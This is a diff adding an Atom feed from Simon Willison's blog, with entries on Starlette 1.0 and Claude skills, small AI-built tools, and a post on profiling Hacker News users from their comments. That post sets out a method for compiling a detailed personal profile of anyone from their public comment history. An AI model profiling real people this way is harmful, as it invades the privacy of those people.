@@ -1,0 +1,762 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xml:lang="en-us" xmlns="http://www.w3.org/2005/Atom"><title>Simon Willison's Weblog</title><link href="http://simonwillison.net/" rel="alternate"/><link href="http://simonwillison.net/atom/everything/" rel="self"/><id>http://simonwillison.net/</id><updated>2026-03-23T02:13:13+00:00</updated><author><name>Simon Willison</name></author><entry><title>Beats now have notes</title><link href="https://simonwillison.net/2026/Mar/23/beats-now-have-notes/#atom-everything" rel="alternate"/><published>2026-03-23T02:13:13+00:00</published><updated>2026-03-23T02:13:13+00:00</updated><id>https://simonwillison.net/2026/Mar/23/beats-now-have-notes/#atom-everything</id><summary type="html">
+    &lt;p&gt;Last month I &lt;a href="https://simonwillison.net/2026/Feb/20/beats/"&gt;added a feature I call beats&lt;/a&gt; to this blog, pulling in some of my other content from &lt;a href="https://simonwillison.net/elsewhere/"&gt;external sources&lt;/a&gt; and including it on the homepage, search and various archive pages on the site.&lt;/p&gt;
+&lt;p&gt;On any given day these frequently outnumber my regular posts. They were looking a little bit thin and were lacking any form of explanation beyond a link, so I've added the ability to annotate them with a "note" which now shows up as part of their display.&lt;/p&gt;
+&lt;p&gt;Here's what that looks like &lt;a href="https://simonwillison.net/2026/Mar/22/"&gt;for the content I published yesterday&lt;/a&gt;:&lt;/p&gt;
+&lt;p&gt;&lt;img class="blogmark-image" style="width:80%" src="https://static.simonwillison.net/static/2026/beats-notes.jpg" alt="Screenshot of part of my blog homepage showing four &amp;quot;beats&amp;quot; entries from March 22, 2026, each tagged as RESEARCH or TOOL, with titles like &amp;quot;PCGamer Article Performance Audit&amp;quot; and &amp;quot;DNS Lookup&amp;quot;, now annotated with short descriptive notes explaining the context behind each linked item."&gt;&lt;/p&gt;
+&lt;p&gt;I've also updated the &lt;a href="https://simonwillison.net/atom/everything/"&gt;/atom/everything/&lt;/a&gt; Atom feed to include any beats that I've attached notes to.&lt;/p&gt;
+
+    &lt;p&gt;Tags: &lt;a href="https://simonwillison.net/tags/atom"&gt;atom&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/blogging"&gt;blogging&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/site-upgrades"&gt;site-upgrades&lt;/a&gt;&lt;/p&gt;
+
+
+
+</summary><category term="atom"/><category term="blogging"/><category term="site-upgrades"/></entry><entry><title>Starlette 1.0 skill</title><link href="https://simonwillison.net/2026/Mar/23/starlette-1-skill/#atom-everything" rel="alternate"/><published>2026-03-23T00:05:00+00:00</published><updated>2026-03-23T00:05:00+00:00</updated><id>https://simonwillison.net/2026/Mar/23/starlette-1-skill/#atom-everything</id><summary type="html">
+    &lt;p&gt;&lt;strong&gt;Research:&lt;/strong&gt; &lt;a href="https://github.com/simonw/research/tree/main/starlette-1-skill#readme"&gt;Starlette 1.0 skill&lt;/a&gt;&lt;/p&gt;
+    &lt;p&gt;See &lt;a href="https://simonwillison.net/2026/Mar/22/starlette/"&gt;Experimenting with Starlette 1.0 with Claude skills&lt;/a&gt;.&lt;/p&gt;
+    
+        &lt;p&gt;Tags: &lt;a href="https://simonwillison.net/tags/starlette"&gt;starlette&lt;/a&gt;&lt;/p&gt;
+    
+
+</summary><category term="starlette"/></entry><entry><title>Experimenting with Starlette 1.0 with Claude skills</title><link href="https://simonwillison.net/2026/Mar/22/starlette/#atom-everything" rel="alternate"/><published>2026-03-22T23:57:44+00:00</published><updated>2026-03-22T23:57:44+00:00</updated><id>https://simonwillison.net/2026/Mar/22/starlette/#atom-everything</id><summary type="html">
+    &lt;p&gt;&lt;a href="https://marcelotryle.com/blog/2026/03/22/starlette-10-is-here/"&gt;Starlette 1.0 is out&lt;/a&gt;! This is a really big deal. I think Starlette may be the Python framework with the most usage compared to its relatively low brand recognition because Starlette is the foundation of &lt;a href="https://fastapi.tiangolo.com/"&gt;FastAPI&lt;/a&gt;, which has attracted a huge amount of buzz that seems to have overshadowed Starlette itself.&lt;/p&gt;
+&lt;p&gt;Kim Christie started working on Starlette in 2018 and it quickly became my favorite out of the new breed of Python ASGI frameworks. The only reason I didn't use it as the basis for my own &lt;a href="https://datasette.io/"&gt;Datasette&lt;/a&gt; project was that it didn't yet promise stability, and I was determined to provide a stable API for Datasette's own plugins... albeit I still haven't been brave enough to ship my own 1.0 release (after 26 alphas and counting)!&lt;/p&gt;
+&lt;p&gt;Then in September 2025 Marcelo Trylesinski &lt;a href="https://github.com/Kludex/starlette/discussions/2997"&gt;announced that Starlette and Uvicorn were transferring to their GitHub account&lt;/a&gt;, in recognition of their many years of contributions and to make it easier for them to receive sponsorship against those projects.&lt;/p&gt;
+&lt;p&gt;The 1.0 version has a few breaking changes compared to the 0.x series, described in &lt;a href="https://starlette.dev/release-notes/#100rc1-february-23-2026"&gt;the release notes for 1.0.0rc1&lt;/a&gt; that came out in February.&lt;/p&gt;
+&lt;p&gt;The most notable of these is a change to how code runs on startup and shutdown. Previously that was handled by &lt;code&gt;on_startup&lt;/code&gt; and &lt;code&gt;on_shutdown&lt;/code&gt; parameters, but the new system uses a neat &lt;a href="https://starlette.dev/lifespan/"&gt;lifespan&lt;/a&gt; mechanism instead based around an &lt;a href="https://docs.python.org/3/library/contextlib.html#contextlib.asynccontextmanager"&gt;async context manager&lt;/a&gt;:&lt;/p&gt;
+&lt;pre&gt;&lt;span class="pl-en"&gt;@&lt;span class="pl-s1"&gt;contextlib&lt;/span&gt;.&lt;span class="pl-c1"&gt;asynccontextmanager&lt;/span&gt;&lt;/span&gt;
+&lt;span class="pl-k"&gt;async&lt;/span&gt; &lt;span class="pl-k"&gt;def&lt;/span&gt; &lt;span class="pl-en"&gt;lifespan&lt;/span&gt;(&lt;span class="pl-s1"&gt;app&lt;/span&gt;):
+    &lt;span class="pl-k"&gt;async&lt;/span&gt; &lt;span class="pl-k"&gt;with&lt;/span&gt; &lt;span class="pl-en"&gt;some_async_resource&lt;/span&gt;():
+        &lt;span class="pl-en"&gt;print&lt;/span&gt;(&lt;span class="pl-s"&gt;"Run at startup!"&lt;/span&gt;)
+        &lt;span class="pl-k"&gt;yield&lt;/span&gt;
+        &lt;span class="pl-en"&gt;print&lt;/span&gt;(&lt;span class="pl-s"&gt;"Run on shutdown!"&lt;/span&gt;)
+
+&lt;span class="pl-s1"&gt;app&lt;/span&gt; &lt;span class="pl-c1"&gt;=&lt;/span&gt; &lt;span class="pl-en"&gt;Starlette&lt;/span&gt;(
+    &lt;span class="pl-s1"&gt;routes&lt;/span&gt;&lt;span class="pl-c1"&gt;=&lt;/span&gt;&lt;span class="pl-s1"&gt;routes&lt;/span&gt;,
+    &lt;span class="pl-s1"&gt;lifespan&lt;/span&gt;&lt;span class="pl-c1"&gt;=&lt;/span&gt;&lt;span class="pl-s1"&gt;lifespan&lt;/span&gt;
+)&lt;/pre&gt;
+&lt;p&gt;If you haven't tried Starlette before it feels to me like an asyncio-native cross between Flask and Django, unsurprising since creator Kim Christie is also responsible for Django REST Framework. Crucially, this means you can write most apps as a single Python file, Flask style.&lt;/p&gt;
+&lt;p&gt;This makes it &lt;em&gt;really&lt;/em&gt; easy for LLMs to spit out a working Starlette app from a single prompt.&lt;/p&gt;
+&lt;p&gt;There's just one problem there: if 1.0 breaks compatibility with the Starlette code that the models have been trained on, how can we have them generate code that works with 1.0?&lt;/p&gt;
+&lt;p&gt;I decided to see if I could get this working &lt;a href="https://simonwillison.net/2025/Oct/16/claude-skills/"&gt;with a Skill&lt;/a&gt;.&lt;/p&gt;
+&lt;h4 id="building-a-skill-with-claude"&gt;Building a Skill with Claude&lt;/h4&gt;
+&lt;p&gt;Regular Claude Chat on &lt;a href="https://claude.ai/"&gt;claude.ai&lt;/a&gt; has skills, and one of those default skills is the &lt;a href="https://github.com/anthropics/skills/blob/main/skills/skill-creator/SKILL.md"&gt;skill-creator skill&lt;/a&gt;. This means Claude knows how to build its own skills.&lt;/p&gt;
+&lt;p&gt;So I started &lt;a href="https://claude.ai/share/b537c340-aea7-49d6-a14d-3134aa1bd957"&gt;a chat session&lt;/a&gt; and told it:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Clone Starlette from GitHub - it just had its 1.0 release. Build a skill markdown document for this release which includes code examples of every feature.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;I didn't even tell it where to find the repo, Starlette is widely enough known that I expected it could find it on its own.&lt;/p&gt;
+&lt;p&gt;It ran &lt;code&gt;git clone https://github.com/encode/starlette.git&lt;/code&gt; which is actually the old repository name, but GitHub handles redirects automatically so this worked just fine.&lt;/p&gt;
+&lt;p&gt;The &lt;a href="https://github.com/simonw/research/blob/main/starlette-1-skill/SKILL.md"&gt;resulting skill document&lt;/a&gt; looked very thorough to me... and then I noticed a new button at the top I hadn't seen before labelled "Copy to your skills". So I clicked it:&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://static.simonwillison.net/static/2026/skill-button.jpg" alt="Screenshot of the Claude.ai interface showing a conversation titled &amp;quot;Starlette 1.0 skill document with code examples.&amp;quot; The left panel shows a chat where the user prompted: &amp;quot;Clone Starlette from GitHub - it just had its 1.0 release. Build a skill markdown document for this release which includes code examples of every feature.&amp;quot; Claude's responses include collapsed sections labeled &amp;quot;Strategized cloning repository and documenting comprehensive feature examples,&amp;quot; &amp;quot;Examined version details and surveyed source documentation comprehensively,&amp;quot; and &amp;quot;Synthesized Starlette 1.0 knowledge to construct comprehensive skill documentation,&amp;quot; with intermediate messages like &amp;quot;I'll clone Starlette from GitHub and build a comprehensive skill document. Let me start by reading the skill-creator guide and then cloning the repo,&amp;quot; &amp;quot;Now let me read through all the documentation files to capture every feature:&amp;quot; and &amp;quot;Now I have a thorough understanding of the entire codebase. Let me build the comprehensive skill document.&amp;quot; The right panel shows a skill preview pane with buttons &amp;quot;Copy to your skills&amp;quot; and &amp;quot;Copy&amp;quot; at the top, and a Description section reading: &amp;quot;Build async web applications and APIs with Starlette 1.0, the lightweight ASGI framework for Python. Use this skill whenever a user wants to create an async Python web app, REST API, WebSocket server, or ASGI application using Starlette. Triggers include mentions of 'Starlette', 'ASGI', async Python web frameworks, or requests to build lightweight async APIs, WebSocket services, streaming responses, or middleware pipelines. Also use when the user is working with FastAPI internals (which is built on Starlette), needs ASGI middleware patterns, or wants a minimal async web server&amp;quot; (text truncated)." style="max-width: 100%;" /&gt;&lt;/p&gt;
+&lt;p&gt;And now my regular Claude chat has access to that skill!&lt;/p&gt;
+&lt;h4 id="a-task-management-demo-app"&gt;A task management demo app&lt;/h4&gt;
+&lt;p&gt;I started &lt;a href="https://claude.ai/share/b5285fbc-5849-4939-b473-dcb66f73503b"&gt;a new conversation&lt;/a&gt; and prompted:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Build a task management app with Starlette, it should have projects and tasks and comments and labels&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;And Claude did exactly that, producing a simple GitHub Issues clone using Starlette 1.0, a SQLite database (via &lt;a href="https://github.com/omnilib/aiosqlite"&gt;aiosqlite&lt;/a&gt;) and a Jinja2 template.&lt;/p&gt;
+&lt;p&gt;Claude even tested the app manually like this:&lt;/p&gt;
+&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;&lt;span class="pl-c1"&gt;cd&lt;/span&gt; /home/claude/taskflow &lt;span class="pl-k"&gt;&amp;amp;&amp;amp;&lt;/span&gt; timeout 5 python -c &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;
+&lt;span class="pl-s"&gt;import asyncio&lt;/span&gt;
+&lt;span class="pl-s"&gt;from database import init_db&lt;/span&gt;
+&lt;span class="pl-s"&gt;asyncio.run(init_db())&lt;/span&gt;
+&lt;span class="pl-s"&gt;print('DB initialized successfully')&lt;/span&gt;
+&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt; &lt;span class="pl-k"&gt;2&amp;gt;&amp;amp;1&lt;/span&gt;
+
+pip install httpx --break-system-packages -q \
+  &lt;span class="pl-k"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="pl-c1"&gt;cd&lt;/span&gt; /home/claude/taskflow &lt;span class="pl-k"&gt;&amp;amp;&amp;amp;&lt;/span&gt; \
+  python -c &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;
+&lt;span class="pl-s"&gt;from starlette.testclient import TestClient&lt;/span&gt;
+&lt;span class="pl-s"&gt;from main import app&lt;/span&gt;
+&lt;span class="pl-s"&gt;&lt;/span&gt;
+&lt;span class="pl-s"&gt;client = TestClient(app)&lt;/span&gt;
+&lt;span class="pl-s"&gt;&lt;/span&gt;
+&lt;span class="pl-s"&gt;r = client.get('/api/stats')&lt;/span&gt;
+&lt;span class="pl-s"&gt;print('Stats:', r.json())&lt;/span&gt;
+&lt;span class="pl-s"&gt;&lt;/span&gt;
+&lt;span class="pl-s"&gt;r = client.get('/api/projects')&lt;/span&gt;
+&lt;span class="pl-s"&gt;print('Projects:', len(r.json()), 'found')&lt;/span&gt;
+&lt;span class="pl-s"&gt;&lt;/span&gt;
+&lt;span class="pl-s"&gt;r = client.get('/api/tasks')&lt;/span&gt;
+&lt;span class="pl-s"&gt;print('Tasks:', len(r.json()), 'found')&lt;/span&gt;
+&lt;span class="pl-s"&gt;&lt;/span&gt;
+&lt;span class="pl-s"&gt;r = client.get('/api/labels')&lt;/span&gt;
+&lt;span class="pl-s"&gt;print('Labels:', len(r.json()), 'found')&lt;/span&gt;
+&lt;span class="pl-s"&gt;&lt;/span&gt;
+&lt;span class="pl-s"&gt;r = client.get('/api/tasks/1')&lt;/span&gt;
+&lt;span class="pl-s"&gt;t = r.json()&lt;/span&gt;
+&lt;span class="pl-s"&gt;print(f'Task 1: &lt;span class="pl-cce"&gt;\"&lt;/span&gt;{t[&lt;span class="pl-cce"&gt;\"&lt;/span&gt;title&lt;span class="pl-cce"&gt;\"&lt;/span&gt;]}&lt;span class="pl-cce"&gt;\"&lt;/span&gt; - {len(t[&lt;span class="pl-cce"&gt;\"&lt;/span&gt;comments&lt;span class="pl-cce"&gt;\"&lt;/span&gt;])} comments, {len(t[&lt;span class="pl-cce"&gt;\"&lt;/span&gt;labels&lt;span class="pl-cce"&gt;\"&lt;/span&gt;])} labels')&lt;/span&gt;
+&lt;span class="pl-s"&gt;&lt;/span&gt;
+&lt;span class="pl-s"&gt;r = client.post('/api/tasks', json={'title':'Test task','project_id':1,'priority':'high','label_ids':[1,2]})&lt;/span&gt;
+&lt;span class="pl-s"&gt;print('Created task:', r.status_code, r.json()['title'])&lt;/span&gt;
+&lt;span class="pl-s"&gt;&lt;/span&gt;
+&lt;span class="pl-s"&gt;r = client.post('/api/comments', json={'task_id':1,'content':'Test comment'})&lt;/span&gt;
+&lt;span class="pl-s"&gt;print('Created comment:', r.status_code)&lt;/span&gt;
+&lt;span class="pl-s"&gt;&lt;/span&gt;
+&lt;span class="pl-s"&gt;r = client.get('/')&lt;/span&gt;
+&lt;span class="pl-s"&gt;print('Homepage:', r.status_code, '- length:', len(r.text))&lt;/span&gt;
+&lt;span class="pl-s"&gt;&lt;/span&gt;
+&lt;span class="pl-s"&gt;print('\nAll tests passed!')&lt;/span&gt;
+&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;For all of the buzz about Claude Code, it's easy to overlook that Claude itself counts as a coding agent now, fully able to both write and then test the code that it is writing.&lt;/p&gt;
+&lt;p&gt;Here's what the resulting app looked like. The code is &lt;a href="https://github.com/simonw/research/blob/main/starlette-1-skill/taskflow"&gt;here in my research repository&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://static.simonwillison.net/static/2026/taskflow.jpg" alt="Screenshot of a dark-themed Kanban board app called &amp;quot;TaskFlow&amp;quot; showing the &amp;quot;Website Redesign&amp;quot; project. The left sidebar has sections &amp;quot;OVERVIEW&amp;quot; with &amp;quot;Dashboard&amp;quot;, &amp;quot;All Tasks&amp;quot;, and &amp;quot;Labels&amp;quot;, and &amp;quot;PROJECTS&amp;quot; with &amp;quot;Website Redesign&amp;quot; (1) and &amp;quot;API Platform&amp;quot; (0). The main area has three columns: &amp;quot;TO DO&amp;quot; (0) showing &amp;quot;No tasks&amp;quot;, &amp;quot;IN PROGRESS&amp;quot; (1) with a card titled &amp;quot;Blog about Starlette 1.0&amp;quot; tagged &amp;quot;MEDIUM&amp;quot; and &amp;quot;Documentation&amp;quot;, and &amp;quot;DONE&amp;quot; (0) showing &amp;quot;No tasks&amp;quot;. Top-right buttons read &amp;quot;+ New Task&amp;quot; and &amp;quot;Delete&amp;quot;." style="max-width: 100%;" /&gt;&lt;/p&gt;
+    
+        &lt;p&gt;Tags: &lt;a href="https://simonwillison.net/tags/open-source"&gt;open-source&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/python"&gt;python&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ai"&gt;ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/asgi"&gt;asgi&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/kim-christie"&gt;kim-christie&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/generative-ai"&gt;generative-ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/llms"&gt;llms&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ai-assisted-programming"&gt;ai-assisted-programming&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/claude"&gt;claude&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/coding-agents"&gt;coding-agents&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/skills"&gt;skills&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/agentic-engineering"&gt;agentic-engineering&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/starlette"&gt;starlette&lt;/a&gt;&lt;/p&gt;
+    
+
+</summary><category term="open-source"/><category term="python"/><category term="ai"/><category term="asgi"/><category term="kim-christie"/><category term="generative-ai"/><category term="llms"/><category term="ai-assisted-programming"/><category term="claude"/><category term="coding-agents"/><category term="skills"/><category term="agentic-engineering"/><category term="starlette"/></entry><entry><title>PCGamer Article Performance Audit</title><link href="https://simonwillison.net/2026/Mar/22/pcgamer-audit/#atom-everything" rel="alternate"/><published>2026-03-22T22:49:00+00:00</published><updated>2026-03-22T22:49:00+00:00</updated><id>https://simonwillison.net/2026/Mar/22/pcgamer-audit/#atom-everything</id><summary type="html">
+    &lt;p&gt;&lt;strong&gt;Research:&lt;/strong&gt; &lt;a href="https://github.com/simonw/research/tree/main/pcgamer-audit#readme"&gt;PCGamer Article Performance Audit&lt;/a&gt;&lt;/p&gt;
+    &lt;p&gt;Stuart Breckenridge pointed out that &lt;a href="https://stuartbreckenridge.net/2026-03-19-pc-gamer-recommends-rss-readers-in-a-37mb-article/"&gt;PC Gamer Recommends RSS Readers in a 37MB Article That Just Keeps Downloading&lt;/a&gt;, highlighting a truly horrifying example of web bloat that added up to 100s more MBs thanks to auto-playing video ads. I decided to have Claude Code for web use &lt;a href="https://github.com/simonw/rodney/"&gt;Rodney&lt;/a&gt; to investigate the page - &lt;a href="https://github.com/simonw/research/pull/101#issue-4117308562"&gt;prompt here&lt;/a&gt;.&lt;/p&gt;
+    
+        &lt;p&gt;Tags: &lt;a href="https://simonwillison.net/tags/web-performance"&gt;web-performance&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/rodney"&gt;rodney&lt;/a&gt;&lt;/p&gt;
+    
+
+</summary><category term="web-performance"/><category term="rodney"/></entry><entry><title>JavaScript Sandboxing Research</title><link href="https://simonwillison.net/2026/Mar/22/javascript-sandboxing-research/#atom-everything" rel="alternate"/><published>2026-03-22T19:53:00+00:00</published><updated>2026-03-22T19:53:00+00:00</updated><id>https://simonwillison.net/2026/Mar/22/javascript-sandboxing-research/#atom-everything</id><summary type="html">
+    &lt;p&gt;&lt;strong&gt;Research:&lt;/strong&gt; &lt;a href="https://github.com/simonw/research/tree/main/javascript-sandboxing-research#readme"&gt;JavaScript Sandboxing Research&lt;/a&gt;&lt;/p&gt;
+    &lt;p&gt;Aaron Harper &lt;a href="https://www.inngest.com/blog/node-worker-threads"&gt;wrote about Node.js worker threads&lt;/a&gt;, which inspired me to run a research task to see if they might help with running JavaScript in a sandbox. Claude Code went way beyond my initial question and produced a comparison of &lt;a href="https://github.com/laverdet/isolated-vm"&gt;isolated-vm&lt;/a&gt;, &lt;a href="https://github.com/patriksimek/vm2"&gt;vm2&lt;/a&gt;, &lt;a href="https://github.com/justjake/quickjs-emscripten"&gt;quickjs-emscripten&lt;/a&gt;, &lt;a href="https://github.com/quickjs-ng/quickjs"&gt;QuickJS-NG&lt;/a&gt;, &lt;a href="https://github.com/tc39/proposal-shadowrealm"&gt;ShadowRealm&lt;/a&gt;, and &lt;a href="https://docs.deno.com/runtime/manual/runtime/workers/"&gt;Deno Workers&lt;/a&gt;.&lt;/p&gt;
+    
+        &lt;p&gt;Tags: &lt;a href="https://simonwillison.net/tags/sandboxing"&gt;sandboxing&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/javascript"&gt;javascript&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/nodejs"&gt;nodejs&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/claude-code"&gt;claude-code&lt;/a&gt;&lt;/p&gt;
+    
+
+</summary><category term="sandboxing"/><category term="javascript"/><category term="nodejs"/><category term="claude-code"/></entry><entry><title>DNS Lookup</title><link href="https://simonwillison.net/2026/Mar/22/dns/#atom-everything" rel="alternate"/><published>2026-03-22T19:16:30+00:00</published><updated>2026-03-22T19:16:30+00:00</updated><id>https://simonwillison.net/2026/Mar/22/dns/#atom-everything</id><summary type="html">
+    &lt;p&gt;&lt;strong&gt;Tool:&lt;/strong&gt; &lt;a href="https://tools.simonwillison.net/dns"&gt;DNS Lookup&lt;/a&gt;&lt;/p&gt;
+    &lt;p&gt;TIL that Cloudflare's 1.1.1.1 DNS service (and 1.1.1.2 and 1.1.1.3, which block malware and malware + adult content respectively) has a CORS-enabled JSON API, so I &lt;a href="https://github.com/simonw/tools/pull/258#issue-4116864108"&gt;had Claude Code build me&lt;/a&gt; a UI for running DNS queries against all three of those resolvers.&lt;/p&gt;
+    
+        &lt;p&gt;Tags: &lt;a href="https://simonwillison.net/tags/dns"&gt;dns&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/cors"&gt;cors&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/cloudflare"&gt;cloudflare&lt;/a&gt;&lt;/p&gt;
+    
+
+</summary><category term="dns"/><category term="cors"/><category term="cloudflare"/></entry><entry><title>Merge State Visualizer</title><link href="https://simonwillison.net/2026/Mar/22/manyana/#atom-everything" rel="alternate"/><published>2026-03-22T18:57:32+00:00</published><updated>2026-03-22T18:57:32+00:00</updated><id>https://simonwillison.net/2026/Mar/22/manyana/#atom-everything</id><summary type="html">
+    &lt;p&gt;&lt;strong&gt;Tool:&lt;/strong&gt; &lt;a href="https://tools.simonwillison.net/manyana"&gt;Merge State Visualizer&lt;/a&gt;&lt;/p&gt;
+    &lt;p&gt;Bram Cohen wrote about his &lt;a href="https://bramcohen.com/p/manyana"&gt;coherent vision for the future of version control&lt;/a&gt; using CRDTs, illustrated by &lt;a href="https://github.com/bramcohen/manyana/blob/main/manyana.py"&gt;470 lines of Python&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;I fed that Python (minus comments) into Claude and asked for &lt;a href="https://claude.ai/share/8ce777cd-c7c3-4656-a45e-acbf66bf994b"&gt;an explanation&lt;/a&gt;, then had it use Pyodide to build me an interactive UI for seeing how the algorithms work.&lt;/p&gt;
+    
+        &lt;p&gt;Tags: &lt;a href="https://simonwillison.net/tags/vcs"&gt;vcs&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/pyodide"&gt;pyodide&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/bram-cohen"&gt;bram-cohen&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/crdt"&gt;crdt&lt;/a&gt;&lt;/p&gt;
+    
+
+</summary><category term="vcs"/><category term="pyodide"/><category term="bram-cohen"/><category term="crdt"/></entry><entry><title>Profiling Hacker News users based on their comments</title><link href="https://simonwillison.net/2026/Mar/21/profiling-hacker-news-users/#atom-everything" rel="alternate"/><published>2026-03-21T23:59:47+00:00</published><updated>2026-03-21T23:59:47+00:00</updated><id>https://simonwillison.net/2026/Mar/21/profiling-hacker-news-users/#atom-everything</id><summary type="html">
+    &lt;p&gt;Here's a mildly dystopian prompt I've been experimenting with recently: "Profile this user", accompanied by a copy of their last 1,000 comments on Hacker News.&lt;/p&gt;
+&lt;p&gt;Obtaining those comments is easy. The &lt;a href="https://hn.algolia.com/api"&gt;Algolia Hacker News API&lt;/a&gt; supports listing comments sorted by date that have a specific tag, and the author of a comment is tagged there as &lt;code&gt;author_username&lt;/code&gt;. Here's a JSON feed of my (&lt;code&gt;simonw&lt;/code&gt;) most recent comments, for example:&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://hn.algolia.com/api/v1/search_by_date?tags=comment,author_simonw&amp;amp;hitsPerPage=1000"&gt;https://hn.algolia.com/api/v1/search_by_date?tags=comment,author_simonw&amp;amp;hitsPerPage=1000&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;The Algolia API is served with open CORS headers, which means you can access the API from JavaScript running on any web page.&lt;/p&gt;
+&lt;p&gt;Last August I &lt;a href="https://chatgpt.com/share/68a4d2b1-a678-8006-aca0-cec51b243bd3"&gt;had ChatGPT build me&lt;/a&gt; a &lt;a href="https://tools.simonwillison.net/hn-comments-for-user"&gt;simple tool&lt;/a&gt; for hitting that API for any user which fetches their comments and gives me a mobile-friendly "copy to clipboard" button. I've since &lt;a href="https://github.com/simonw/tools/commits/main/hn-comments-for-user.html"&gt;tweaked it a few times&lt;/a&gt; with Claude.&lt;/p&gt;
+&lt;p&gt;I can then paste the whole lot into any LLM - these days I mostly use Claude Opus 4.6 for this - and prompt "profile this user" to see what it can figure out.&lt;/p&gt;
+&lt;p&gt;It's startlingly effective! It feels invasive to quote the profile of another user here, so I'll show you what it produces for me:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;This is &lt;strong&gt;Simon Willison&lt;/strong&gt; — a prolific, independent software developer, blogger, and one of the most visible voices in the AI-assisted coding space. Here's a profile drawn from his comments:&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Professional identity:&lt;/strong&gt; Independent developer and writer. Co-creator of Django, creator of Datasette and many other open source tools. On the board of the Python Software Foundation. Runs a heavily-trafficked personal blog at simonwillison.net with multiple content types (entries, link blog, notes, quotations). Monetizes through GitHub sponsors, ethical ads, and occasional consulting — not through any AI company payroll, a point he defends frequently.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Core thesis on AI coding:&lt;/strong&gt; He's the leading evangelist for what he calls "agentic engineering" — using coding agents (Claude Code, Codex CLI) as productivity multipliers for skilled developers. His central argument: LLMs don't replace programmers, they amplify existing expertise. He's writing a guide/book on this at simonwillison.net/guides. He insists these tools are deceptively difficult to use well, and that most people who report bad results simply haven't learned the craft yet.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Working style:&lt;/strong&gt; He does most of his programming from his iPhone via Claude Code for web, often while riding BART, walking the dog, or sitting in the garden. He embraces "YOLO mode" (auto-approving agent actions) and frequently runs 2-3 agent sessions in parallel. He starts every session with "run uv run pytest" to anchor the agent in TDD. He's on the $200/month Claude Max plan.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Key technical interests:&lt;/strong&gt; Sandboxing and security (WebAssembly, Pyodide, sandbox-exec, Firecracker), SQLite (deeply), Python packaging and tooling (uv, PyPI distribution tricks), browser-in-a-browser experiments (v86, WASM Linux), and local LLM inference. He's been learning Go "by osmosis" through coding agents.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Security consciousness:&lt;/strong&gt; He coined the term "prompt injection" and the "lethal trifecta" (access to private data + exposure to untrusted input + ability to take actions). He's genuinely alarmed about OpenClaw/Clawdbot security risks and has been predicting a headline-grabbing prompt injection attack "in the next six months" for over two years — acknowledging it keeps not happening while insisting the risk is real. He references the "normalization of deviance" pattern frequently.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Personality and debate style:&lt;/strong&gt; Energetic, combative when challenged, but generally good-natured. He engages heavily in HN comment threads — sometimes dozens of replies in a single discussion. He's transparent about his biases and maintains a public disclosures page. He pushes back hard against what he sees as motivated reasoning from AI skeptics, but also against AGI hype ("I refer to that as the science fiction version of AI"). He gets visibly frustrated by sock-puppet accounts and bad-faith criticism. He has a self-deprecating streak ("my stupid pelican benchmark").&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Recurring themes across hundreds of comments:&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;"Two things can be true at the same time" — he holds nuanced positions&lt;/li&gt;
+&lt;li&gt;Tests are for productivity, not just quality&lt;/li&gt;
+&lt;li&gt;The November 2025 model releases (Opus 4.5, GPT-5.2) were a genuine inflection point&lt;/li&gt;
+&lt;li&gt;Code review is the biggest bottleneck in agent-assisted workflows&lt;/li&gt;
+&lt;li&gt;"Cognitive debt" is a real and unsolved problem&lt;/li&gt;
+&lt;li&gt;The best engineering practices (tests, docs, CI/CD, clean code) also make agents work better&lt;/li&gt;
+&lt;li&gt;He's deliberately trying to "teach people good software engineering while tricking them into thinking the book is about AI"&lt;/li&gt;
+&lt;/ul&gt;
